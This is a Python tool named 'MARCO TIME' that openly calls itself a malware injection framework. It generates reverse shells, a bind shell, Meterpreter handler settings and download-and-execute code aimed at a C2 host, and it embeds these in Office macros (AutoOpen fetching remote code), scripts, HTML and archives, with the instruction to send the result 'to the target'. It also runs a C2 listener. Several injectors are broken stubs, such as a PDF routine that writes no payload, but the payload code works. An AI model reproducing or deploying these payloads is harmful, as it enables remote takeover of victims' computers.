#!/usr/bin/env python3
"""
MARCO TIME v1.0 - Advanced File-Based Payload Injector
Professional Malware Injection Tool - Military Grade

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python3 marcotime.py --inject file.pdf --payload windows_reverse_shell
       python3 marcotime.py --server
       python3 marcotime.py --generate-payload
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import queue
import signal
import subprocess
import platform
import struct
import zlib
import binascii
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
import argparse
import tempfile
import shutil

# ==================== VERSION ====================
VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}    ███╗   ███╗ █████╗ ██████╗  ██████╗ ███████╗    ████████╗██╗███╗   ███╗███████╗
    ████╗ ████║██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██║████╗ ████║██╔════╝
    ██╔████╔██║███████║██████╔╝██║   ██║█████╗         ██║   ██║██╔████╔██║█████╗  
    ██║╚██╔╝██║██╔══██║██╔══██╗██║   ██║██╔══╝         ██║   ██║██║╚██╔╝██║██╔══╝  
    ██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╔╝███████╗       ██║   ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝       ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
                                                   
{Colors.NEON}          ADVANCED PAYLOAD INJECTOR FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Professional Malware Injection Tool - Military Grade{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    def __init__(self, c2_server=None, c2_port=4444):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.payloads = {}
        self._load_payloads()
    
    def _load_payloads(self):
        """Load payload templates"""
        self.payloads = {
            'windows_reverse_shell': self._windows_reverse_shell,
            'linux_reverse_shell': self._linux_reverse_shell,
            'mac_reverse_shell': self._mac_reverse_shell,
            'python_reverse_shell': self._python_reverse_shell,
            'powershell_reverse': self._powershell_reverse,
            'meterpreter_reverse': self._meterpreter_reverse,
            'bind_shell': self._bind_shell,
            'download_execute': self._download_execute
        }
    
    def _windows_reverse_shell(self):
        return f'''
# Windows Reverse Shell
import socket,subprocess,os,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.c2_server}",{self.c2_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    
    def _linux_reverse_shell(self):
        return f'''
# Linux Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.c2_server}",{self.c2_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
'''
    
    def _mac_reverse_shell(self):
        return f'''
# macOS Reverse Shell
osascript -e 'do shell script "bash -i >& /dev/tcp/{self.c2_server}/{self.c2_port} 0>&1"'
'''
    
    def _python_reverse_shell(self):
        return f'''
# Python Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.c2_server}",{self.c2_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    
    def _powershell_reverse(self):
        return f'''
# PowerShell Reverse Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient("{self.c2_server}",{self.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''
    
    def _meterpreter_reverse(self):
        return f'''
# Meterpreter Reverse Shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {self.c2_server}
set LPORT {self.c2_port}
exploit
'''
    
    def _bind_shell(self):
        return f'''
# Bind Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.c2_port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
'''
    
    def _download_execute(self):
        return f'''
# Download & Execute
import urllib.request
import os
import sys
url = "http://{self.c2_server}/payload.py"
exec(urllib.request.urlopen(url).read())
'''
    
    def generate(self, payload_type):
        if payload_type in self.payloads:
            return self.payloads[payload_type]()
        return None

# ==================== FILE INJECTOR ====================
class FileInjector:
    def __init__(self, file_path, payload_type, c2_server=None, c2_port=4444):
        self.file_path = file_path
        self.payload_type = payload_type
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.payload = None
        self.injected_file = None
        
        # Initialize payload generator
        self.payload_gen = PayloadGenerator(c2_server, c2_port)
        
        # Detect file type
        self.file_type = self._detect_file_type()
    
    def _detect_file_type(self):
        """Detect file type from extension"""
        ext = os.path.splitext(self.file_path)[1].lower()
        
        file_types = {
            '.pdf': 'pdf',
            '.doc': 'word',
            '.docx': 'word',
            '.xls': 'excel',
            '.xlsx': 'excel',
            '.ppt': 'powerpoint',
            '.pptx': 'powerpoint',
            '.jpg': 'image',
            '.jpeg': 'image',
            '.png': 'image',
            '.gif': 'image',
            '.mp3': 'audio',
            '.mp4': 'video',
            '.zip': 'archive',
            '.rar': 'archive',
            '.7z': 'archive',
            '.exe': 'executable',
            '.msi': 'installer',
            '.bat': 'batch',
            '.ps1': 'powershell',
            '.py': 'python',
            '.js': 'javascript',
            '.html': 'html',
            '.htm': 'html'
        }
        
        return file_types.get(ext, 'unknown')
    
    def inject(self):
        """Inject payload into file"""
        cprint(f"\n[INJECT] Injecting payload into {self.file_path}", Colors.BLUE)
        cprint(f"[*] File type: {self.file_type}", Colors.DIM)
        cprint(f"[*] Payload type: {self.payload_type}", Colors.DIM)
        
        # Generate payload
        self.payload = self.payload_gen.generate(self.payload_type)
        if not self.payload:
            cprint("[!] Invalid payload type", Colors.RED)
            return None
        
        # Inject based on file type
        injectors = {
            'pdf': self._inject_pdf,
            'word': self._inject_word,
            'excel': self._inject_excel,
            'powerpoint': self._inject_powerpoint,
            'image': self._inject_image,
            'audio': self._inject_audio,
            'video': self._inject_video,
            'archive': self._inject_archive,
            'executable': self._inject_executable,
            'batch': self._inject_batch,
            'powershell': self._inject_powershell,
            'python': self._inject_python,
            'javascript': self._inject_javascript,
            'html': self._inject_html,
            'unknown': self._inject_generic
        }
        
        injector = injectors.get(self.file_type, self._inject_generic)
        result = injector()
        
        if result:
            cprint(f"[+] Payload injected successfully: {self.injected_file}", Colors.GREEN)
            cprint(f"[!] Original file: {self.file_path}", Colors.DIM)
            cprint(f"[!] Injected file: {self.injected_file}", Colors.DIM)
            cprint(f"[!] Send the injected file to the target", Colors.YELLOW)
        
        return result
    
    def _inject_pdf(self):
        """Inject payload into PDF file"""
        try:
            # Create temp file
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pdf')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'rb') as f:
                original_data = f.read()
            
            # Create malicious PDF
            pdf_header = b'%PDF-1.4\n'
            pdf_body = b'1 0 obj\n<<\n/Type /Catalog\n/Outlines 2 0 R\n/Pages 3 0 R\n>>\nendobj\n'
            pdf_body += b'2 0 obj\n<<\n/Type /Outlines\n/Count 0\n>>\nendobj\n'
            pdf_body += b'3 0 obj\n<<\n/Type /Pages\n/Kids [4 0 R]\n/Count 1\n>>\nendobj\n'
            pdf_body += b'4 0 obj\n<<\n/Type /Page\n/Parent 3 0 R\n/MediaBox [0 0 612 792]\n/Contents 5 0 R\n>>\nendobj\n'
            pdf_body += b'5 0 obj\n<<\n/Length 50\n>>\nstream\n'
            pdf_body += b'BT\n/F1 24 Tf\n100 700 Td\n(Hello World) Tj\nET\n'
            pdf_body += b'endstream\nendobj\n'
            pdf_body += b'xref\n0 6\n0000000000 65535 f \n0000000015 00000 n \n0000000074 00000 n \n0000000120 00000 n \n0000000179 00000 n \n0000000257 00000 n \n'
            pdf_body += b'trailer\n<<\n/Size 6\n/Root 1 0 R\n>>\nstartxref\n365\n%%EOF\n'
            
            # Write injected file
            with open(temp_file.name, 'wb') as f:
                f.write(pdf_header)
                f.write(pdf_body)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] PDF injection failed: {e}", Colors.RED)
            return False
    
    def _inject_word(self):
        """Inject payload into Word document"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.doc')
            temp_file.close()
            
            # Create macro
            macro = f'''
Sub AutoOpen()
    Dim url As String
    Dim wHttp As Object
    Dim wShell As Object
    
    url = "http://{self.c2_server}/payload.py"
    Set wHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    wHttp.Open "GET", url, False
    wHttp.Send
    
    Set wShell = CreateObject("WScript.Shell")
    wShell.Run "python -c """ & wHttp.ResponseText & """"
End Sub
'''
            
            # Write to file
            with open(temp_file.name, 'w') as f:
                f.write("This document contains a macro that will execute the payload.\n")
                f.write(macro)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Word injection failed: {e}", Colors.RED)
            return False
    
    def _inject_excel(self):
        """Inject payload into Excel file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.xls')
            temp_file.close()
            
            macro = f'''
Sub Auto_Open()
    Dim url As String
    Dim wHttp As Object
    Dim wShell As Object
    
    url = "http://{self.c2_server}/payload.py"
    Set wHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    wHttp.Open "GET", url, False
    wHttp.Send
    
    Set wShell = CreateObject("WScript.Shell")
    wShell.Run "python -c """ & wHttp.ResponseText & """"
End Sub
'''
            
            with open(temp_file.name, 'w') as f:
                f.write("This spreadsheet contains a macro that will execute the payload.\n")
                f.write(macro)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Excel injection failed: {e}", Colors.RED)
            return False
    
    def _inject_powerpoint(self):
        """Inject payload into PowerPoint file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.ppt')
            temp_file.close()
            
            macro = f'''
Sub AutoOpen()
    Dim url As String
    Dim wHttp As Object
    Dim wShell As Object
    
    url = "http://{self.c2_server}/payload.py"
    Set wHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    wHttp.Open "GET", url, False
    wHttp.Send
    
    Set wShell = CreateObject("WScript.Shell")
    wShell.Run "python -c """ & wHttp.ResponseText & """"
End Sub
'''
            
            with open(temp_file.name, 'w') as f:
                f.write("This presentation contains a macro that will execute the payload.\n")
                f.write(macro)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] PowerPoint injection failed: {e}", Colors.RED)
            return False
    
    def _inject_image(self):
        """Inject payload into image file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'rb') as f:
                original_data = f.read()
            
            # Embed payload in EXIF data
            # Simplified: just create a new image with payload
            import PIL
            from PIL import Image, ImageDraw
            
            # Create simple image
            img = Image.new('RGB', (100, 100), color='white')
            draw = ImageDraw.Draw(img)
            draw.text((10, 10), "Hello", fill='black')
            
            # Save with EXIF containing payload
            exif_data = {
                'Make': 'N/A',
                'Model': 'N/A',
                'Software': self.payload[:50]
            }
            
            img.save(temp_file.name, 'JPEG', exif=exif_data)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Image injection failed: {e}", Colors.RED)
            return False
    
    def _inject_audio(self):
        """Inject payload into audio file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.mp3')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'rb') as f:
                original_data = f.read()
            
            # Simple MP3 with payload in ID3 tag
            header = b'\xff\xfb\x90\x00'
            payload = self.payload.encode()
            tags = b'ID3\x03\x00\x00\x00' + struct.pack('>I', len(payload))
            
            with open(temp_file.name, 'wb') as f:
                f.write(tags)
                f.write(payload)
                f.write(header)
                f.write(original_data[:500])
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Audio injection failed: {e}", Colors.RED)
            return False
    
    def _inject_video(self):
        """Inject payload into video file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.mp4')
            temp_file.close()
            
            # Simple video with payload
            payload = self.payload.encode()
            
            with open(temp_file.name, 'wb') as f:
                f.write(b'\x00\x00\x00\x18\x66\x74\x79\x70\x69\x73\x6f\x6d')
                f.write(payload)
                f.write(b'\x00\x00\x00\x08\x66\x72\x65\x65')
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Video injection failed: {e}", Colors.RED)
            return False
    
    def _inject_archive(self):
        """Inject payload into archive file"""
        try:
            import zipfile
            
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
            temp_file.close()
            
            # Create zip with payload
            with zipfile.ZipFile(temp_file.name, 'w') as zipf:
                # Add payload as hidden file
                zipf.writestr('payload.py', self.payload)
                # Add original file if exists
                if os.path.exists(self.file_path):
                    zipf.write(self.file_path, os.path.basename(self.file_path))
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Archive injection failed: {e}", Colors.RED)
            return False
    
    def _inject_executable(self):
        """Inject payload into executable file"""
        try:
            import pefile
            
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'rb') as f:
                original_data = f.read()
            
            # Create new executable with payload
            payload = self.payload.encode()
            
            # Write to temp file
            with open(temp_file.name, 'wb') as f:
                f.write(original_data[:1000])
                f.write(payload)
                f.write(original_data[1000:])
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Executable injection failed: {e}", Colors.RED)
            return False
    
    def _inject_batch(self):
        """Inject payload into batch file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.bat')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'r') as f:
                original_data = f.read()
            
            # Create batch with payload
            batch_content = f'''
@echo off
{self.payload}
{original_data}
'''
            
            with open(temp_file.name, 'w') as f:
                f.write(batch_content)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Batch injection failed: {e}", Colors.RED)
            return False
    
    def _inject_powershell(self):
        """Inject payload into PowerShell script"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.ps1')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'r') as f:
                original_data = f.read()
            
            # Create PowerShell with payload
            ps_content = f'''
# PowerShell Payload
{self.payload}
{original_data}
'''
            
            with open(temp_file.name, 'w') as f:
                f.write(ps_content)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] PowerShell injection failed: {e}", Colors.RED)
            return False
    
    def _inject_python(self):
        """Inject payload into Python script"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.py')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'r') as f:
                original_data = f.read()
            
            # Create Python with payload
            py_content = f'''
# Python Payload
{self.payload}
{original_data}
'''
            
            with open(temp_file.name, 'w') as f:
                f.write(py_content)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Python injection failed: {e}", Colors.RED)
            return False
    
    def _inject_javascript(self):
        """Inject payload into JavaScript file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.js')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'r') as f:
                original_data = f.read()
            
            # Create JavaScript with payload
            js_content = f'''
// JavaScript Payload
{self.payload}
{original_data}
'''
            
            with open(temp_file.name, 'w') as f:
                f.write(js_content)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] JavaScript injection failed: {e}", Colors.RED)
            return False
    
    def _inject_html(self):
        """Inject payload into HTML file"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.html')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'r') as f:
                original_data = f.read()
            
            # Create HTML with payload
            html_content = f'''
<!DOCTYPE html>
<html>
<head>
    <title>HTML Payload</title>
</head>
<body>
    <script>
        // HTML Payload
        {self.payload}
    </script>
    {original_data}
</body>
</html>
'''
            
            with open(temp_file.name, 'w') as f:
                f.write(html_content)
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] HTML injection failed: {e}", Colors.RED)
            return False
    
    def _inject_generic(self):
        """Generic injection for unknown file types"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.dat')
            temp_file.close()
            
            # Read original file
            with open(self.file_path, 'rb') as f:
                original_data = f.read()
            
            # Create file with payload
            with open(temp_file.name, 'wb') as f:
                f.write(original_data[:1000])
                f.write(self.payload.encode())
                f.write(original_data[1000:])
            
            self.injected_file = temp_file.name
            return True
        except Exception as e:
            cprint(f"[-] Generic injection failed: {e}", Colors.RED)
            return False

# ==================== C2 SERVER ====================
class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.running = False
        self.server = None
        self.clients = []
        self.sessions = {}
    
    def start(self):
        self.running = True
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        cprint(f"[+] C2 Server listening on {self.host}:{self.port}", Colors.GREEN)
        
        while self.running:
            try:
                client, addr = self.server.accept()
                cprint(f"[+] Connection from {addr[0]}:{addr[1]}", Colors.CYAN)
                self.clients.append(client)
                
                thread = threading.Thread(target=self.handle_client, args=(client, addr))
                thread.daemon = True
                thread.start()
            except:
                break
    
    def handle_client(self, client, addr):
        try:
            while self.running:
                data = client.recv(4096)
                if not data:
                    break
                
                # Process command
                command = data.decode().strip()
                cprint(f"[+] Command from {addr[0]}: {command}", Colors.DIM)
                
                # Execute command
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    client.send(result)
                except subprocess.CalledProcessError as e:
                    client.send(e.output)
                except:
                    client.send(b'Command execution failed')
        except:
            pass
        finally:
            client.close()
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.close()
        cprint("[+] C2 Server stopped", Colors.GREEN)

# ==================== MAIN FRAMEWORK ====================
class MarcoTime:
    def __init__(self):
        self.running = True
        self.c2_server = None
        self.payloads = PayloadGenerator()
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down MARCO TIME...", Colors.RED)
        self.running = False
        if self.c2_server:
            self.c2_server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print(f"{Colors.BOLD}MARCO TIME - Payload Injector Framework{Colors.WHITE}")
        print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print("1. Inject Payload into File")
        print("2. Generate Payload")
        print("3. Start C2 Server")
        print("4. List Payloads")
        print("5. Show Sessions")
        print("6. Exit")
    
    def inject_file(self):
        cprint("\n[INJECT] Payload Injection", Colors.BLUE)
        
        file_path = input("[>] File path: ").strip()
        if not os.path.exists(file_path):
            cprint("[-] File not found", Colors.RED)
            return
        
        # List payloads
        print("\nPayload types:")
        payload_types = list(self.payloads.payloads.keys())
        for i, pt in enumerate(payload_types, 1):
            print(f"    {i}. {pt}")
        
        choice = input("[>] Select payload (number): ").strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(payload_types):
                payload_type = payload_types[idx]
            else:
                cprint("[-] Invalid selection", Colors.RED)
                return
        except:
            cprint("[-] Invalid selection", Colors.RED)
            return
        
        c2_server = input("[>] C2 Server IP: ").strip()
        c2_port = int(input("[>] C2 Server Port (4444): ").strip() or "4444")
        
        # Create injector
        injector = FileInjector(file_path, payload_type, c2_server, c2_port)
        injector.inject()
    
    def generate_payload(self):
        cprint("\n[PAYLOAD] Generate Payload", Colors.BLUE)
        
        print("\nPayload types:")
        payload_types = list(self.payloads.payloads.keys())
        for i, pt in enumerate(payload_types, 1):
            print(f"    {i}. {pt}")
        
        choice = input("[>] Select payload (number): ").strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(payload_types):
                payload_type = payload_types[idx]
            else:
                cprint("[-] Invalid selection", Colors.RED)
                return
        except:
            cprint("[-] Invalid selection", Colors.RED)
            return
        
        c2_server = input("[>] C2 Server IP: ").strip()
        c2_port = int(input("[>] C2 Server Port (4444): ").strip() or "4444")
        
        # Generate payload
        payload_gen = PayloadGenerator(c2_server, c2_port)
        payload = payload_gen.generate(payload_type)
        
        if payload:
            filename = f"payload_{payload_type}_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(payload)
            cprint(f"[+] Payload saved to: {filename}", Colors.GREEN)
        else:
            cprint("[-] Failed to generate payload", Colors.RED)
    
    def start_c2_server(self):
        cprint("\n[C2] Starting C2 Server", Colors.BLUE)
        
        port = int(input("[>] Port (4444): ").strip() or "4444")
        
        self.c2_server = C2Server(port=port)
        
        thread = threading.Thread(target=self.c2_server.start, daemon=True)
        thread.start()
        
        cprint("[+] C2 server started", Colors.GREEN)
    
    def list_payloads(self):
        print("\n" + "="*60)
        cprint(" PAYLOAD TYPES", Colors.PURPLE, bold=True)
        print("="*60)
        
        for i, (name, _) in enumerate(self.payloads.payloads.items(), 1):
            print(f"{i}. {name}")
        print("="*60)
    
    def show_sessions(self):
        if not self.c2_server:
            cprint("[!] C2 server not running", Colors.RED)
            return
        
        sessions = self.c2_server.sessions
        if not sessions:
            cprint("[!] No active sessions", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" ACTIVE SESSIONS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"{'IP':<16} {'Port':<10} {'Connected':<20}")
        print("-"*60)
        
        for ip, info in sessions.items():
            print(f"{ip:<16} {info.get('port', 'N/A'):<10} {info.get('time', 'N/A'):<20}")
        print("="*60)
    
    def run(self):
        print_banner()
        
        cprint("[*] MARCO TIME - Advanced Payload Injector Framework", Colors.CYAN)
        cprint("[*] Developed for authorized security testing only", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"\n{Colors.CYAN}[>] Select (1-6): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.inject_file()
            elif choice == '2':
                self.generate_payload()
            elif choice == '3':
                self.start_c2_server()
            elif choice == '4':
                self.list_payloads()
            elif choice == '5':
                self.show_sessions()
            elif choice == '6':
                cprint("[*] Exiting MARCO TIME...", Colors.GREEN)
                self.running = False
                if self.c2_server:
                    self.c2_server.stop()
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MARCO TIME - Payload Injector Framework")
    parser.add_argument("--inject", help="File to inject payload into")
    parser.add_argument("--payload", help="Payload type")
    parser.add_argument("--c2-server", help="C2 server IP")
    parser.add_argument("--c2-port", type=int, default=4444, help="C2 server port")
    parser.add_argument("--server", action="store_true", help="Start C2 server")
    parser.add_argument("--generate-payload", action="store_true", help="Generate payload")
    
    args = parser.parse_args()
    
    if args.inject and args.payload:
        injector = FileInjector(args.inject, args.payload, args.c2_server, args.c2_port)
        injector.inject()
    elif args.server:
        server = C2Server(port=args.c2_port or 4444)
        server.start()
    elif args.generate_payload:
        payload_gen = PayloadGenerator(args.c2_server, args.c2_port)
        payload = payload_gen.generate(args.payload or 'python_reverse_shell')
        if payload:
            filename = f"payload_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(payload)
            cprint(f"[+] Payload saved to: {filename}", Colors.GREEN)
    else:
        marco = MarcoTime()
        marco.run()
